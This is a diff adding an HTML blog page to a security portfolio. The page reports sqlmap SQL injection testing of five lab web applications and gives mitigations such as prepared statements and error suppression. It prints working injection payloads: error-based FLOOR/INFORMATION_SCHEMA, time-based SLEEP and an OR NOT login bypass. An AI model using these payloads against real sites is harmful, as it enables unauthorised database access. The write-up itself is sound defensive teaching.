+                <tr><td class="param-name">Email</td><td>POST</td><td>Boolean-based blind (AND clause)</td></tr>
+                <tr><td class="param-name">Email</td><td>POST</td><td>Error-based (FLOOR / INFORMATION_SCHEMA)</td></tr>
+                <tr><td class="param-name">Email</td><td>POST</td><td>Time-based blind (SLEEP)</td></tr>
+              </tbody>
+            </table>
+            <div class="code-block">
+              <div class="code-top">
+                <div class="code-dots"><div class="cdot"></div><div class="cdot"></div><div class="cdot"></div></div>
+                <span class="code-fname">sqlmap — LOG-2025-004</span>
+                <span class="ctag ctag-red">Error-Based — INFORMATION_SCHEMA Leak</span>
+              </div>
+              <div class="code-body"><pre><span class="cm"># Leaks data via MySQL FLOOR(RAND) error in GROUP BY</span>
+<span class="vr">Email</span><span class="op">=</span>dd@gmail.com<span class="hl">' AND (SELECT 6667 FROM(
+  SELECT COUNT(*),
+  CONCAT(0x717a6a7871,
+    (SELECT (ELT(6667=6667,1))),
+    0x7176766271,
+    FLOOR(RAND(0)*2)
+  )x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x
+)a)-- Slta</span></pre></div>
+            </div>
+            <div class="code-block">
+              <div class="code-top">
+                <div class="code-dots"><div class="cdot"></div><div class="cdot"></div><div class="cdot"></div></div>
+                <span class="code-fname">sqlmap — LOG-2025-004</span>
+                <span class="ctag ctag-gold">Time-Based Blind</span>
+              </div>
+              <div class="code-body"><pre><span class="cm"># Parameter: Email — subquery SLEEP</span>
+<span class="vr">Email</span><span class="op">=</span>dd@gmail.com<span class="hl">' AND (SELECT 5386 FROM (SELECT(SLEEP(5)))qdfU)-- bygY</span></pre></div>
+            </div>
+            <a href="log4.html" class="log-view-link"><i class="fas fa-file-alt"></i> View Full Log</a>
+          </div>
+        </div>
+      </div>
+
+      <div class="art-divider"></div>
+
+      <!-- LOG 005 -->
+      <div class="blog-section" id="log005">
+        <div class="section-label">LOG-2025-005</div>
+        <h2>Bus Management System — Login Form</h2>
+
+        <div class="log-card">
+          <div class="log-card-header">
+            <div><div class="log-card-id">LOG-2025-005</div></div>
+            <div class="log-card-title">Bus Management System</div>
+            <div class="log-card-meta">
+              <span><i class="fas fa-calendar-alt"></i> 2025-03-10</span>
+              <span><i class="fas fa-exchange-alt"></i> 132 HTTP requests</span>
+              <span><i class="fas fa-code"></i> PHP 8.2.12 / Apache 2.4.58</span>
+              <span><i class="fas fa-database"></i> MySQL ≥ 5.0 (MariaDB)</span>
+            </div>
+          </div>
+          <div class="log-card-body">
+            <p class="log-card-desc">
+              The bus management system login was vulnerable to all three injection types in only 132 requests — the most efficient detection in the series. The NOT-based boolean payload was also used here, alongside the standard error-based FLOOR technique and a SLEEP-based time delay.
+            </p>
+            <div class="vuln-types">
+              <span class="vtag vtag-bool">Boolean-Based Blind</span>
+              <span class="vtag vtag-error">Error-Based</span>
+              <span class="vtag vtag-time">Time-Based Blind</span>
+            </div>
+            <table class="param-table">
+              <thead><tr><th>Parameter</th><th>Method</th><th>Injection Type</th></tr></thead>
+              <tbody>
+                <tr><td class="param-name">username</td><td>POST</td><td>Boolean-based blind (OR NOT)</td></tr>
+                <tr><td class="param-name">username</td><td>POST</td><td>Error-based (FLOOR)</td></tr>
+                <tr><td class="param-name">username</td><td>POST</td><td>Time-based blind (SLEEP)</td></tr>
+              </tbody>
+            </table>
+            <div class="code-block">
+              <div class="code-top">
+                <div class="code-dots"><div class="cdot"></div><div class="cdot"></div><div class="cdot"></div></div>
+                <span class="code-fname">sqlmap — LOG-2025-005</span>
+                <span class="ctag ctag-orange">Boolean-Based Blind (OR NOT)</span>
+              </div>
+              <div class="code-body"><pre><span class="cm"># Parameter: username — OR NOT boolean blind</span>
+<span class="vr">username</span><span class="op">=</span>sdfg<span class="hl">' OR NOT 1458=1458#</span><span class="op">&</span><span class="vr">password</span><span class="op">=</span>sdfgdfg<span class="op">&</span><span class="vr">login</span><span class="op">=</span>Login</pre></div>
+            </div>
+            <div class="code-block">
+              <div class="code-top">
+                <div class="code-dots"><div class="cdot"></div><div class="cdot"></div><div class="cdot"></div></div>
+                <span class="code-fname">sqlmap — LOG-2025-005</span>
+                <span class="ctag ctag-red">Error-Based (FLOOR)</span>
+              </div>
+              <div class="code-body"><pre><span class="cm"># FLOOR(RAND) error extraction via GROUP BY</span>
+<span class="vr">username</span><span class="op">=</span>sdfg<span class="hl">' AND (SELECT 4580 FROM(
+  SELECT COUNT(*),
+  CONCAT(0x7162787871,
+    (SELECT (ELT(4580=4580,1))),
+    0x7176767071,
+    FLOOR(RAND(0)*2)
+  )x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x
+)a)-- Xqpe</span></pre></div>
+            </div>
+            <a href="log5.html" class="log-view-link"><i class="fas fa-file-alt"></i> View Full Log</a>
+          </div>
+        </div>
+      </div>
+
+      <div class="art-divider"></div>
+
+      <!-- MITIGATIONS -->
+      <div class="blog-section" id="mitigations">
+        <div class="section-label">Defense</div>
+        <h2>Mitigations — Applied to All Five Targets</h2>
+        <p>Every vulnerability found across these five applications shares the same root cause: <strong>unsanitized user input interpolated directly into SQL queries</strong>. The fixes below eliminate all identified injection vectors.</p>
+
+        <div class="mitigation-list">
+          <div class="mit-item">
+            <div class="mit-num">01</div>
+            <div class="mit-body">
+              <div class="mit-title">Use Parameterized Queries / Prepared Statements</div>
+              <p class="mit-desc">The single most effective fix. User input is never interpolated into the SQL string — it is passed as a separate parameter that the database driver handles safely.</p>
+              <div class="mit-code">// PHP PDO — safe
+$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ?");
+$stmt->execute([$username]);</div>
+            </div>
+          </div>
+          <div class="mit-item">
+            <div class="mit-num">02</div>
+            <div class="mit-body">
+              <div class="mit-title">Validate and Sanitize All Input at the Boundary</div>
+              <p class="mit-desc">Even with prepared statements, validate that inputs match expected formats — emails should be emails, integers should be integers. Reject anything that doesn't conform before it reaches the database layer.</p>
+            </div>
+          </div>
+          <div class="mit-item">
+            <div class="mit-num">03</div>
+            <div class="mit-body">
+              <div class="mit-title">Suppress Detailed Database Error Messages</div>
+              <p class="mit-desc">Error-based injection (used in LOGs 001, 004, 005) depends on MySQL error output being visible to the client. In production, set <code>display_errors = Off</code> and log errors server-side only.</p>
+              <div class="mit-code">; php.ini — production
+display_errors = Off
+log_errors = On
+error_log = /var/log/php_errors.log</div>
+            </div>
+          </div>
+          <div class="mit-item">
+            <div class="mit-num">04</div>
+            <div class="mit-body">
+              <div class="mit-title">Use an ORM Framework</div>
+              <p class="mit-desc">Frameworks like Laravel's Eloquent, Doctrine, or Django ORM build parameterized queries by default. They eliminate manual query construction errors across the entire application — not just one endpoint.</p>
+            </div>
+          </div>
+          <div class="mit-item">
+            <div class="mit-num">05</div>
+            <div class="mit-body">
+              <div class="mit-title">Apply the Principle of Least Privilege</div>
+              <p class="mit-desc">The database user your application connects with should only have <code>SELECT</code>, <code>INSERT</code>, <code>UPDATE</code> permissions on the tables it needs — never <code>DROP</code>, <code>GRANT</code>, or access to <code>INFORMATION_SCHEMA</code>.</p>
+              <div class="mit-code">-- Create a restricted DB user
+CREATE USER 'app_user'@'localhost' IDENTIFIED BY 'strong_pass';
+GRANT SELECT, INSERT, UPDATE ON app_db.* TO 'app_user'@'localhost';</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div class="art-divider"></div>
+
+      <!-- SUMMARY LOG -->
+      <div class="blog-section" id="summary">
+        <div class="section-label">Research Summary</div>
+        <h2>Consolidated Findings</h2>
+        <div class="code-block">
+          <div class="code-top">
+            <div class="code-dots"><div class="cdot"></div><div class="cdot"></div><div class="cdot"></div></div>
+            <span class="code-fname">SQLi-SERIES-2025.txt</span>
+            <span class="ctag ctag-blue">Research Only</span>
+          </div>
+          <div class="code-body"><pre><span class="vr">SERIES_ID</span>    <span class="op">=</span> <span class="str">"LOG-2025-001 through LOG-2025-005"</span>
+<span class="vr">DATE</span>         <span class="op">=</span> <span class="str">"2025-03-10"</span>
+<span class="vr">RESEARCHER</span>   <span class="op">=</span> <span class="str">"Habtamu Bitew Gashu"</span>
+<span class="vr">TOOL</span>         <span class="op">=</span> <span class="str">"sqlmap (open source)"</span>
+<span class="vr">METHOD</span>       <span class="op">=</span> <span class="str">"Black-box automated injection testing"</span>
+<span class="vr">ENVIRONMENT</span>  <span class="op">=</span> <span class="str">"Local / controlled lab — no production systems"</span>
+
+<span class="cm"># ── Targets ──────────────────────────────────────────────</span>
+<span class="vr">TARGET_1</span> <span class="op">=</span> { <span class="str">"app"</span>: <span class="str">"Local Web App"</span>,         <span class="str">"requests"</span>: <span class="num">119</span>, <span class="str">"vulns"</span>: <span class="num">3</span> }
+<span class="vr">TARGET_2</span> <span class="op">=</span> { <span class="str">"app"</span>: <span class="str">"Travel System — Login"</span>,  <span class="str">"requests"</span>: <span class="num">769</span>, <span class="str">"vulns"</span>: <span class="num">2</span> }
+<span class="vr">TARGET_3</span> <span class="op">=</span> { <span class="str">"app"</span>: <span class="str">"Travel System — Forms"</span>,  <span class="str">"requests"</span>: <span class="num">260</span>, <span class="str">"vulns"</span>: <span class="num">2</span> }
+<span class="vr">TARGET_4</span> <span class="op">=</span> { <span class="str">"app"</span>: <span class="str">"User Registration"</span>,     <span class="str">"requests"</span>: <span class="num">272</span>, <span class="str">"vulns"</span>: <span class="num">3</span> }
+<span class="vr">TARGET_5</span> <span class="op">=</span> { <span class="str">"app"</span>: <span class="str">"Bus Management System"</span>, <span class="str">"requests"</span>: <span class="num">132</span>, <span class="str">"vulns"</span>: <span class="num">3</span> }
+
+<span class="cm"># ── Aggregate ────────────────────────────────────────────</span>
+<span class="vr">TOTAL_REQUESTS</span>       <span class="op">=</span> <span class="num">1552</span>
+<span class="vr">TARGETS_VULNERABLE</span>   <span class="op">=</span> <span class="num">5</span> <span class="op">/</span> <span class="num">5</span>  <span class="cm"># 100% hit rate</span>
+<span class="vr">BOOLEAN_BASED_FOUND</span>  <span class="op">=</span> <span class="num">4</span>  <span class="cm"># LOGs 001, 002, 004, 005</span>
+<span class="vr">ERROR_BASED_FOUND</span>    <span class="op">=</span> <span class="num">3</span>  <span class="cm"># LOGs 001, 004, 005</span>
+<span class="vr">TIME_BASED_FOUND</span>     <span class="op">=</span> <span class="num">5</span>  <span class="cm"># all five targets</span>
+<span class="vr">UNIQUE_PARAMS</span>        <span class="op">=</span> [<span class="str">"user"</span>, <span class="str">"username"</span>, <span class="str">"Email"</span>, <span class="str">"firstname"</span>]
+<span class="vr">BACKEND_STACK</span>        <span class="op">=</span> <span class="str">"PHP 8.x / Apache 2.4.x / MySQL (MariaDB fork)"</span>
+
+<span class="cm"># ── Root cause ───────────────────────────────────────────</span>
+<span class="vr">ROOT_CAUSE</span>   <span class="op">=</span> <span class="str">"Unsanitized user input interpolated directly into SQL queries"</span>
+<span class="vr">MISSING</span>      <span class="op">=</span> [<span class="str">"Prepared statements"</span>, <span class="str">"Input validation"</span>, <span class="str">"Error suppression"</span>]</pre></div>
+        </div>
+      </div>
+
+      <!-- BACK NAV -->
+      <div class="blog-nav-back">
+        <a href="../index.html#cyberlogs" class="btn btn--outline">
+          <i class="fas fa-arrow-left"></i> Back to Cyberlogs
+        </a>
+        <a href="../index.html" class="btn btn--outline">
+          <i class="fas fa-home"></i> Back to Portfolio
+        </a>
+      </div>
+
+    </article>
+
+    <!-- SIDEBAR -->
+    <aside class="blog-sidebar">
+      <div class="sidebar-card">
+        <div class="sidebar-title">Table of Contents</div>
+        <a href="#matrix"      class="toc-item"><span class="toc-num">00</span> Vulnerability Matrix</a>
+        <a href="#log001"      class="toc-item"><span class="toc-num">01</span> Local Web App</a>
+        <a href="#log002"      class="toc-item"><span class="toc-num">02</span> Travel — Login</a>
+        <a href="#log003"      class="toc-item"><span class="toc-num">03</span> Travel — Forms</a>
+        <a href="#log004"      class="toc-item"><span class="toc-num">04</span> User Registration</a>
+        <a href="#log005"      class="toc-item"><span class="toc-num">05</span> Bus Management</a>
+        <a href="#mitigations" class="toc-item"><span class="toc-num">06</span> Mitigations</a>
+        <a href="#summary"     class="toc-item"><span class="toc-num">07</span> Summary</a>
+      </div>
+
+      <div class="sidebar-card">
+        <div class="sidebar-title">Series Stats</div>
+        <div class="smeta-item"><span class="sl">Logs Covered</span><span class="sv">001 – 005</span></div>
+        <div class="smeta-item"><span class="sl">Date</span><span class="sv">Mar 10, 2025</span></div>
+        <div class="smeta-item"><span class="sl">Total Requests</span><span class="sv" style="color:var(--blue);">1,552</span></div>
+        <div class="smeta-item"><span class="sl">Targets Hit</span><span class="sv" style="color:var(--green);">5 / 5</span></div>
+        <div class="smeta-item"><span class="sl">Tool</span><span class="sv">sqlmap</span></div>
+        <div class="smeta-item"><span class="sl">Read Time</span><span class="sv">10 min</span></div>
+      </div>
+
+      <div class="sidebar-card">
+        <div class="sidebar-title">Injection Types</div>
+        <div style="display:flex;flex-wrap:wrap;gap:0.4rem;">
+          <span class="vtag vtag-bool">Boolean-Based</span>
+          <span class="vtag vtag-error">Error-Based</span>
+          <span class="vtag vtag-time">Time-Based</span>
+        </div>
+      </div>
+
+      <div class="sidebar-card">
+        <div class="sidebar-title">Individual Logs</div>
+        <a href="log1.html" class="toc-item"><span class="toc-num">→</span> LOG-2025-001</a>
+        <a href="log2.html" class="toc-item"><span class="toc-num">→</span> LOG-2025-002</a>
+        <a href="log3.html" class="toc-item"><span class="toc-num">→</span> LOG-2025-003</a>
+        <a href="log4.html" class="toc-item"><span class="toc-num">→</span> LOG-2025-004</a>
+        <a href="log5.html" class="toc-item"><span class="toc-num">→</span> LOG-2025-005</a>
+      </div>
+    </aside>
+
+  </div>
+
+  <a href="#top" aria-label="ScrollTop" class="fas fa-angle-up" id="scroll-top"></a>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" integrity="sha512-894YE6QWD5I59HgZOGReFYm4dnWc1Qt5NtvYSaNcOP+u1T9qYdvdihz0PPSiiqn/+/3e7Jo4EaG7TubfWGUrMQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+  <script src="https://unpkg.com/scrollreveal"></script>
+  <script src="../assets/js/script.js"></script>
+</body>
+</html>
